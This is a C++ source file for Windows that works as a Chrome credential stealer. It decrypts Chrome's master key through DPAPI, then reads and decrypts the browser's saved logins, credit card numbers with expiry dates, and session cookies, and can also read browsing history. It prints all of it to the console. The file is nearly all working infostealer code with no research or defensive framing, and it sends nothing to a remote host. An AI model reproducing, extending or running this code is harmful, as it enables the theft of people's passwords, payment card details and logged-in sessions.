#include <Windows.h>
#include <Shlwapi.h>
#include <iostream>
#include <string>
#include <fstream>
#include <regex>
#include <vector>
#include <filesystem>
#include "base64.h"
#include "sodium.h"
#include "sqlite3.h"
#pragma comment (lib, "Crypt32.lib")
#pragma comment (lib, "Shlwapi.lib")
bool OUTPUT_HISTORY_DATA = false;

int CheckIfPathExists(std::string ToCheck) {
	std::wstring WToCheck(ToCheck.begin(), ToCheck.end());
	int x = PathFileExists(WToCheck.c_str());
	return x;
}

std::string GetHomePath() {
	FILE* File = _popen("echo %USERPROFILE%", "r");
	char Buffer[100];
	std::string HomePath;
	while (fgets(Buffer, 100, File)) {
		HomePath += Buffer;
	}
	HomePath.erase(std::remove(HomePath.begin(), HomePath.end(), '\n'), HomePath.end());
	return HomePath;
}

BYTE* GetChromiumBasedMasterKey(std::string LocalStatePath) {
	std::ifstream FS(LocalStatePath);
	std::string LocalStateData;
	std::getline(FS, LocalStateData);
	std::regex RegexPattern("\"encrypted_key\":\"(.*?)\"");
	std::smatch FakeMatch;
	std::regex_search(LocalStateData, FakeMatch, RegexPattern);
	std::string Match = FakeMatch[1].str();
	DWORD Size = Match.size();
	DWORD MasterKeySize = 0;
	CryptStringToBinaryA(Match.c_str(), Match.size(), CRYPT_STRING_BASE64, nullptr, &MasterKeySize, NULL, NULL);
	std::vector<BYTE> HalfMasterKey((int)MasterKeySize);
	CryptStringToBinaryA(Match.c_str(), Match.size(), CRYPT_STRING_BASE64, HalfMasterKey.data(), &MasterKeySize, NULL, NULL);
	HalfMasterKey.erase(HalfMasterKey.begin(), HalfMasterKey.begin() + 5);
	DATA_BLOB DataIn;
	DATA_BLOB DataOut;
	DataIn.pbData = HalfMasterKey.data();
	DataIn.cbData = HalfMasterKey.size();
	CryptUnprotectData(&DataIn, nullptr, nullptr, nullptr, nullptr, 0, &DataOut);
	BYTE* MasterKey = DataOut.pbData;
	return MasterKey;
}

std::string DecryptChromiumBased(const unsigned char* WholePassword, unsigned long long WholePasswordSize, BYTE* MasterKey) {
	unsigned char IV[12];
	std::string StringPassword = reinterpret_cast<const char*>(WholePassword);
	if (StringPassword.substr(0, 3) == "v10") {
		size_t realPasswordSize = WholePasswordSize - 15;
		BYTE* RealPassword = (BYTE*)malloc(realPasswordSize);
		if (!RealPassword) {
			return "MEMORY ALLOCATION FAILED";
		}
		memcpy(IV, WholePassword + 3, sizeof(IV));
		memcpy(RealPassword, WholePassword + 15, realPasswordSize);
		unsigned char Decrypted[1024];
		unsigned long long DecryptedSize = sizeof(Decrypted);
		if (crypto_aead_aes256gcm_decrypt(Decrypted, &DecryptedSize, NULL, RealPassword, realPasswordSize, NULL, NULL, IV, MasterKey) != 0) {
			free(RealPassword);
			return "DECRYPTION FAILED\n";
		}
		std::string DecryptedTrimmed(reinterpret_cast<const char*>(Decrypted), DecryptedSize);
		free(RealPassword);
		return DecryptedTrimmed;
	}
	else if (StringPassword.substr(0, 3) == "v20") {
		return "V20 APPBOUND (NEW)";
	}
	else {
		return "UNKNOWN VERSION";
	}
}

void DumpChromiumBased() {
	BYTE* MasterKey = GetChromiumBasedMasterKey(GetHomePath() + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State");
	std::string StringMasterKey = reinterpret_cast<const char*>(MasterKey);
	std::cout<<"MASTER KEY {{{{" << StringMasterKey + "}}}}\n";
	std::string LoginDataPath = GetHomePath() + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
	std::string HistoryDataPath = GetHomePath() + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History";
	std::string CardDataPath = GetHomePath() + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data";
	std::string CookieDataPath = GetHomePath() + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";

	sqlite3* SQLite;
	sqlite3_stmt* STMT;
	// CHECKS IF LOGIN DATA EXISTS AND DUMPS
	if (CheckIfPathExists(LoginDataPath) == 1) {
		std::cout<<"LOGIN DATA FILE EXISTS\n";
		if (sqlite3_open(LoginDataPath.c_str(), &SQLite) == SQLITE_OK) {
			std::cout<<"SUCCESSFULLY OPENED LOGIN DATA FILE\n";
			sqlite3_prepare(SQLite, "SELECT * FROM logins", -1, &STMT, NULL);
			int RowNum = 0;
			while (sqlite3_step(STMT) == SQLITE_ROW) {
				const unsigned char* Origin = sqlite3_column_text(STMT, 0);
				const unsigned char* Username = sqlite3_column_text(STMT, 3);
				const unsigned char* Password = sqlite3_column_text(STMT, 5);
				unsigned long long WholePasswordSize = sqlite3_column_bytes(STMT, 5);
				std::string StringOrigin = reinterpret_cast<const char*>(Origin);
				std::string StringUsername = reinterpret_cast<const char*>(Username);
				std::string StringPassword = reinterpret_cast<const char*>(Password);
				std::string DecryptedStringPassword = DecryptChromiumBased(Password, WholePasswordSize, MasterKey);
				std::cout << "Origin URL : " << StringOrigin << "\n";
				std::cout << "Username : " << StringUsername << "\n";
				std::cout << "Password : " << DecryptedStringPassword << "\n\n";
				RowNum += 1;
			}
			sqlite3_finalize(STMT);
			sqlite3_close(SQLite);
		}
		else {
			std::cout<<"FAILED TO OPEN LOGIN DATA FILE\n";
		}
	}
	else {
		std::cout<<"LOGIN DATA FILE DOES NOT EXIST\n";
	}
	// CHECKS IF HISTORY DATA EXISTS AND DUMPS
	if (CheckIfPathExists(HistoryDataPath) == 1 && OUTPUT_HISTORY_DATA) {
		std::cout<<"HISTORY DATA FILE EXISTS\n";
		if (sqlite3_open(HistoryDataPath.c_str(), &SQLite) == SQLITE_OK) {
			std::cout << "SUCCESSFULLY OPENED HISTORY DATA FILE\n";
			sqlite3_prepare(SQLite, "SELECT url FROM urls", -1, &STMT, NULL);
			int RowNum = 0;
			while (sqlite3_step(STMT) == SQLITE_ROW) {
				const unsigned char* URL = sqlite3_column_text(STMT, 0);
				std::string StringURL = reinterpret_cast<const char*>(URL);
				std::cout << "Visit : " << StringURL << "\n\n";
				RowNum += 1;
			}
			sqlite3_finalize(STMT);
			sqlite3_close(SQLite);
		}
		else {
			std::cout<<"FAILED TO OPEN HISTORY DATA FILE\n";
		}
	}
	else {
		std::cout<<"HISTORY DATA FILE DOES NOT EXIST\n";
	}
	// CHECKS IF CREDIT CARD DATA EXISTS AND DUMPS
	if (CheckIfPathExists(CardDataPath) == 1) {
		std::cout<<"CREDIT CARD DATA FILE EXISTS\n";
		if (sqlite3_open(CardDataPath.c_str(), &SQLite) == SQLITE_OK) {
			std::cout<<"SUCCESSFULLY OPENED CREDIT CARD DATA FILE\n";
			sqlite3_prepare(SQLite, "SELECT name_on_card, card_number_encrypted, expiration_year, expiration_month FROM credit_cards", -1, &STMT, NULL);
			int RowNum = 0;
			while (sqlite3_step(STMT) == SQLITE_ROW) {
				const unsigned char* CardName = sqlite3_column_text(STMT, 0);
				const unsigned char* CardNumber = sqlite3_column_text(STMT, 1);
				unsigned long long CardNumberSize = sqlite3_column_bytes(STMT, 1);
				const unsigned char* ExpirationYear = sqlite3_column_text(STMT, 2);
				const unsigned char* ExpirationMonth = sqlite3_column_text(STMT, 3);
				unsigned long long ExpirationMonthSize = sqlite3_column_bytes(STMT, 1);
				std::string StringCardName = reinterpret_cast<const char*>(CardName);
				std::string StringCardNumber = DecryptChromiumBased(reinterpret_cast<const unsigned char*>(CardNumber), CardNumberSize, MasterKey);
				std::string StringExpirationYear = reinterpret_cast<const char*>(ExpirationYear);
				std::string StringExpirationMonth = DecryptChromiumBased(reinterpret_cast<const unsigned char*>(ExpirationMonth), ExpirationMonthSize, MasterKey);
				std::cout << "Card Name : " << StringCardName << "\n";
				std::cout << "Card Number : " << StringCardNumber << "\n";
				std::cout << "Expiration Year : " << StringExpirationYear << "\n";
				std::cout << "Expiration Month : " << StringExpirationMonth << "\n\n";
				RowNum += 1;
			}
			sqlite3_finalize(STMT);
			sqlite3_close(SQLite);
		}
		else {
			std::cout<<"FAILED TO OPEN CREDIT CARD DATA FILE\n";
		}
	}
	else {
		std::cout<<"CREDIT CARD DATA FILE DOES NOT EXIST\n";
	}
	// CHECKS IF COOKIE DATA EXISTS AND DUMPS
	if (CheckIfPathExists(CookieDataPath) == 1) {
		std::cout<<"COOKIE DATA FILE EXISTS\n";
		if (sqlite3_open(CookieDataPath.c_str(), &SQLite) == SQLITE_OK) {
			std::cout<<"SUCCESSFULLY OPENED COOKIE DATA FILE\n";
			sqlite3_prepare(SQLite, "SELECT host_key, name, encrypted_value FROM cookies", -1, &STMT, NULL);
			int RowNum = 0;
			while (sqlite3_step(STMT) == SQLITE_ROW) {
				const unsigned char* CookieURL = sqlite3_column_text(STMT, 0);
				const unsigned char* CookieName = sqlite3_column_text(STMT, 1);
				const unsigned char* CookieValue = sqlite3_column_text(STMT, 2);
				unsigned long long CookieValueSize = sqlite3_column_bytes(STMT, 2);
				std::string StringCookieURL = reinterpret_cast<const char*>(CookieURL);
				std::string StringCookieName = reinterpret_cast<const char*>(CookieName);
				std::string StringCookieValue = reinterpret_cast<const char*>(CookieValue);
				std::string DecryptedStringCookieValue = DecryptChromiumBased(reinterpret_cast<const unsigned char*>(CookieValue), CookieValueSize, MasterKey);
				std::cout << "Cookie URL : " << StringCookieURL << "\n";
				std::cout << "Cookie Name : " << StringCookieName << "\n";
				std::cout << "Cookie Value : " << DecryptedStringCookieValue << "\n\n";
				RowNum += 1;
			}
			sqlite3_finalize(STMT);
			sqlite3_close(SQLite);
		}
		else {
			std::cout<<"FAILED TO OPEN COOKIE DATA FILE\n";
		}
	}
	else {
		std::cout<<"COOKIE DATA FILE DOES NOT EXIST\n";
	}
}

int main() {
	DumpChromiumBased();
	return 69;
}